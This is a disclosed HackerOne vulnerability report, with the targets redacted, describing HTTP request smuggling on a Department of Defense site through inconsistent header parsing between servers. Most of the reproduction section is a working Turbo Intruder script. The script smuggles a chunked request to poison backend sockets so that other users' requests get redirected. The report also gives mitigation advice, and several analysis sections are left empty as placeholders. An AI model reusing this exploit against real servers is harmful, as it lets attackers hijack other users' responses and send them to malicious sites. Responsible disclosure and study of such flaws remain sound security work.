---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '526880'
original_report_id: '526880'
title: Request smuggling on ████████
weakness: HTTP Request Smuggling
team_handle: deptofdefense
created_at: '2019-04-04T14:55:55.466Z'
disclosed_at: '2019-10-08T18:42:20.348Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 24
tags:
- hackerone
- http-request-smuggling
---

# Request smuggling on ████████

## Metadata

- HackerOne Report ID: 526880
- Weakness: HTTP Request Smuggling
- Program: deptofdefense
- Disclosed At: 2019-10-08T18:42:20.348Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**


**Description:**
The sites at █████████ and ww.██████████ are vulnerable to backend socket poisoning which enables attackers to hijack responses to other users.

This vulnerability occurs because the backend server regards` \n` as a valid header ending, whereas the backend only thinks `\r\n` is valid. This means it's possible to send requests that are interpreted differently by the two servers, leading to backend socket poisoning.

## Impact
Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required.

## Step-by-step Reproduction Instructions
To replicate this with minimal risk of affecting legitimate users we'll target stage.████████ instead of ██████████, and use the following turbo intruder script:

I've hard-coded the endpoint to ██████████ because it appears that you've got multiple endpoints for stage.█████████ and some are not vulnerable.
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='https://██████████:443',
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )
    engine.start()    

    attack = '''POST /████ HTTP/1.1
Fooz: bar\nTransfer-Encoding: chunked
Host: stage.█████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Foo: bar

0

GET███████ HTTP/1.1
X: X'''

    engine.queue(attack)

    victim = '''GET /foo.jpg?x=%s HTTP/1.1
Host: stage.████████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: keep-alive

'''
    for i in range(15):
        engine.queue(victim, i)
        time.sleep(0.2)


def handleResponse(req, interesting):
    table.add(req)

 ```
You should observe that one of the responses to a victim request is a 302 redirect to █████████

## Suggested Mitigation/Remediation Actions
When I resolve stage.███ I get a bunch of IP addresses, and only some of these appear to be vulnerable. As such, you should be able to resolve this issue by making these servers consistent:

```
stage.████████.		59	IN	A	██████████
stage.████.		59	IN	A	████████
stage.█████.		59	IN	A	██████
stage.███████.		59	IN	A	█████
stage.████.		59	IN	A	██████████
stage.██████████.		59	IN	A	█████
```

## Impact

Unauthenticated, remote attackers can randomly redirect active users to malicious websites, with no user-interaction required. Socket poisoning also enables a variety of other attacks which I haven't time to explore on your site.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
